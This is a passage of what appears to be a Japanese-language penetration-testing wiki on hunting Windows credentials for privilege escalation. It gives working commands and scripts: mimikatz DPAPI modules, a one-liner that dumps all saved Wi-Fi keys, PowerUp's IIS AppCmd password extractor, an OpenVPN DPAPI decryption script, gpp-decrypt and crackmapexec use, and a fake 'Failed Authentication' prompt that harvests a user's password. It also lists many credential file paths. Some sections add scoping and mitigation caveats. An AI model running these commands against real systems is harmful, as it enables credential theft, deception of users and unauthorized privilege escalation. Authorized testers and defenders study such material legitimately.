**DPAPI は、ユーザーのログインシークレットから導出される対称鍵を使って鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPI で暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` は、ユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに格納されている DPAPI キー**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます）。

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して **mimikatz module** `dpapi::masterkey` を使用すると、復号できます。

**master password で保護された credentials files** は通常、次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell の認証情報

**PowerShell の認証情報**は、暗号化された認証情報を手軽に保存する方法として、**スクリプト作成**や自動化タスクでよく使われます。認証情報は**DPAPI**で保護されており、通常は作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた認証情報のファイル名や`.xml`のパスは任意です。スクリプトやファイルの一覧からファイルが見つかった場合は、`C:\Users`にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを特定してください。[Windowsではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手掛かりにすぎません。[Windowsの`Export-Clixml`は、暗号化された認証情報をエクスポートしたユーザーとコンピューターにひも付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象サービスで有効な権限を持つことも別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を表示せずに、まずパスとACLを確認してください。

認証情報が含まれるファイルからPS認証情報を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers` にあります。

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg ファイルを復号**します\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから多数の DPAPI masterkey を**抽出**できます

**mRemoteNG は異なる接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べ、`config.xml` のような一般的な名前のファイルも確認してください。XML ファイルを認証情報の手がかりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使用されたかどうかによります。広範な列挙の際に、暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダーから読み取れる場合があります。旧形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。空でない password 要素は、出力したり平文だと決めつけたりせず、認証情報の手がかりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成時のアカウントとコンピューターに紐付けることも、より厳密でない設定にすることもできます。これを頼りにする前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Sticky Notes アプリケーションにパスワードなどの情報を保存する人もいます。Microsoft のパッケージ版 Sticky Notes アプリは、通常 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にメモを保存します。旧版や別のアプリでは、LevelDB など、他のユーザープロファイル内のストアを使用する場合があります。SQLite ファイルが見つからないことをメモが存在しない根拠とみなす前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたメモが含まれないことがあります。データベースの整合性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保持し、利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むメモは、あくまで認証情報の手がかりです。アカウント、許可されたアクセス権、パスワードの使い回しをそれぞれ別途確認してください。暗号化された password manager のレコードから、より高い権限のログインを立証するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator 権限が必要であり、High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、一部の**認証情報**が設定されており、**復元**できる可能性があります。

このコードは[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)から抜粋したものです：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行されるため、多くの場合** **DLL Sideloading に対して脆弱です（情報元：** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

古いリモートサポートのインストールでは、固定のアプリケーションレジストリキーの下に、パスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、バージョン9より前のTeamViewerでは、`SecurityPasswordAES`が設定済みの固定セッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。その認証情報を評価する前に、インストールされているバージョン、値データを読み取れるか、その形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より高い権限を持つWindowsアカウントに至るには、実際にパスワードが再利用されており、そのアカウントの使用が許可されている必要もあります。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウント情報が含まれている疑いがある場合、**ファイルの暗号化**と、ワークシートの保護や非表示の列を区別してください。[Microsoftによると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制限するものであり、セキュリティ機能ではありません。それだけでブックの内容が暗号化されているとはいえません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な`.xlsx`のパス、保護されたシート、または非表示の列だけでは、認証情報の存在や、いずれかのアカウントがより高い権限を持つことは証明できません。実際のデータと現在のアカウント権限は、別途確認してください。

### CIサーバーに残る変更パッチ

CIサーバーは、ビルド完了後も、送信されたソース変更をデータディレクトリに保持している場合があります。[TeamCityのドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes`はremote-runの変更を保存する場所とされています。データディレクトリは設定可能であり、必ずしも`ProgramData`の下にあるとは限りません。読み取り可能なパッチには、削除または追加された認証情報ファイル、暗号化キー、あるいはその両方を使用するスクリプトへの参照が残っている場合があります。たとえば、PowerShellの`ConvertTo-SecureString -Key`を使う処理には、暗号化された文字列だけでなくAESキーも必要です。[Microsoftのドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチ名だけを確認し、その後、許可された範囲で関連する内容を調べてください。通常の列挙出力に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や、より高い権限へのアクセスは証明できません。データディレクトリのACLを制限し、ビルド変更に秘密情報をコミットしないでください。

### 独自のローカル管理者パスワードローテーション

自作のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存しながら、データストアの認証情報を読み取り可能な`.env`ファイルやアップデーターのバイナリと同じ場所に置いている場合があります。アップデーターのスケジュールされたタスク、アカウント、構成ファイルのACL、リスナー、データストアの権限を合わせて確認してください。ループバックのみで待ち受けるデータストアでも、有効な認証情報を持つローカルユーザーはアクセスできます。ただし、認証できることだけでは、該当するレコードを読み取る権限があるとは証明できません。暗号化のシードやキー素材が暗号文の近くからアクセスできる場合は、その暗号化を信頼する前に、正確な鍵導出方法を確認してください。公開されたシードからGoの[`math/rand`](https://pkg.go.dev/math/rand)を使ってAESキーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Goのドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には適さないとされています。復元したパスワードを権限昇格の経路として扱う前に、そのパスワードが現在も有効であり、ローカルのAdministratorsグループに属するアカウントのものであることを確認してください。スケジュールされたタスク、`.env`のパス、または暗号化されたデータだけでは、これらの条件はいずれも証明できません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには[Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたはEntraに基づく保存先とアクセス制御は、独自のローカルデータストアとは異なります。同様に、[Elasticsearchのロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Javaサーバーのプラグインアーカイブと認証情報の再利用

一部のJavaサーバープラグインは、サーバーの`plugins`ディレクトリにJARアーカイブとして配布されます。読み取り可能なカスタムプラグインには、サービス認証情報が埋め込まれた構成やバイトコードが含まれている場合があります。許可された場合にのみアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報が存在するとは証明できません。また、サービスのパスワードを復元できても、より高い権限を持つアカウントでも有効でなければ、権限昇格にはつながりません。関連ファイルのACLを確認し、再利用された認証情報をそれぞれ異なる秘密情報に置き換えてください。ディレクトリ構成については[PaperMCのプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については[OracleのJARドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire組み込みデータベースの認証情報

組み込みデータベースを使うOpenfireのインストールでは、`openfire.script`が`Openfire\embedded-db`に置かれている場合があります。現在のアカウントで読み取り可能な場合は、`OFUSER`レコードと`passwordKey`プロパティを合わせて確認してください。Openfireの[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存するか、そのプロパティに格納されたキーで暗号化できます。復元したパスワードが権限昇格につながるのは、より高い権限を持つIDに対して現在も有効な場合に限られます。ファイル名だけでは、読み取り権限も認証情報の再利用も証明できません。このパスはインベントリ調査の手がかりです。通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別の`Openfire\conf\openfire.xml`ファイルからは、外部データベースを使っている場合でも、管理コンソールに設定されたポートやバインドインターフェースがわかることがあります。Openfireは通常、管理コンソールをループバックにバインドしますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスにアクセスできます。実際のリスナー、許可された管理者ロール、プラグインアップロードポリシー、Openfireサービスの実行IDを合わせて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスがLocalSystemとして実行されている場合、高い権限で実行される可能性があります。一致するアカウントのパスワードや読み取り可能な構成パスだけでは、管理コンソールへのアクセスやコード実行は証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロードAPIのプロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの構成

Velociraptorサーバーの構成ファイルは、一般に`server.config.yaml`という名前で、内部CAの`CA.private_key`を含むことがあります。低い権限のユーザーがそのキーを読み取れる場合、APIクライアント証明書を発行できる可能性があります。それによって権限が高まるかどうかは、サーバーのユーザーロール、APIへの到達可能性、サーバーまたは対象エージェントが実行されるIDによって異なります。クライアント構成には別の情報が含まれます。クライアント構成が見つかっただけでは、サーバーCAへのアクセスは証明されません。CA秘密鍵をオフラインで保管するデプロイもあるため、読み取り可能なサーバー構成に署名キーが含まれていない場合もあります。

Windowsサーバーでは、インストールディレクトリにある**サーバー**構成ファイルと、保護されたバックアップコピーのACLを確認してください。場所の例は`%ProgramFiles%\VelociraptorServer\server.config.yaml`です。異なる場合は、サービスに設定されたパスを使用してください。現在のIDでファイルを読み取れることと、`CA.private_key`が実際に存在することを確認してください。ログや列挙出力に秘密鍵を表示しないでください。ベンダーの`config api_client`ワークフローでは、CAキーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込み権限や再起動が必要になる場合があります。これらの書き込みができなくても、既存の特権サーバーIDが経路となることがあります。実行権限を持つAPIクエリは、該当するサーバーまたはエージェントのコンテキストで実行され、高い権限を持つ可能性があります。

サーバー構成ファイルとバックアップは制限的なACLで保護し、可能な場合はCA署名キーをオフラインで保管し、APIロールとリスナーへのアクセスを制限してください。[Velociraptor APIドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ構成のガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Puttyの認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートされたセッションのバックアップは`sessions-backup.dat`という名前で、別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートデータはパスワードで暗号化されており、セッション、キー、スクリプト、タグ、関連情報が含まれる場合があります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルを見つけても、パスワードが判明するわけではなく、保存済みの認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### Putty SSH ホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内のSSHキー

SSH private keyはレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されることがあるため、そこに興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、おそらく保存された SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始するようにしたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この technique はもう有効ではないようです。ssh keys を作成して `ssh-add` で追加し、ssh でマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使われていることを確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

内容の例:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEMのバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセスできるバックアップまたはイメージのディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、通常の `install.wim`、`boot.wim`、リカバリーイメージはよくある誤検知です。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) および [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** というファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使用して、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPO) に、ドメインユーザーなら誰でもアクセスできました。さらに、GPP 内のパスワードは、公開されている既定の鍵で AES256 暗号化されていましたが、認証済みユーザーなら誰でも復号できました。そのため、ユーザーが昇格した権限を取得する深刻なリスクがありました。

このリスクを軽減するため、「cpassword」フィールドが空でないローカルキャッシュ済み GPP ファイルを検索する関数が開発されました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには、GPP とファイルの場所に関する詳細が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に古い ZIP バックアップが直接置かれていると、過去の設定ファイルや再利用可能な認証情報が漏えいするおそれがあります。露出と判断する前に、サイトに設定された物理パスと、アーカイブに HTTP 経由で実際にアクセスできるかを確認してください。既定の `C:\inetpub\wwwroot` は候補の一つにすぎません。簡単なローカル調査では、アーカイブを開かずに名前とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、回収した認証情報によって権限が昇格することも証明できません。

### OpenVPN の認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう、いつでも尋ねることができます**（ただし、クライアントに**認証情報**を直接**尋ねる**のは非常に**リスクが高い**ことに注意してください）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことが確認されているファイル名。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般的に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、内容を読める、ロックを解除できる、または保存された認証情報を使用できることを示すものではありません。保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロックを解除するには、実際の master password と、設定されている場合は key-file やアカウント要素が必要です。認可された調査でエントリに LM:NT hash ペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT hash が現在も有効で、対象の NTLM サービスに受け入れられるかを確認してください。vault のエントリだけでは Administrator または SYSTEM 権限は得られません。リモートサービスへのアクセス、アカウント権限、および別途必要となるサービス実行の手順も満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

候補となるすべてのファイルを検索してください:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
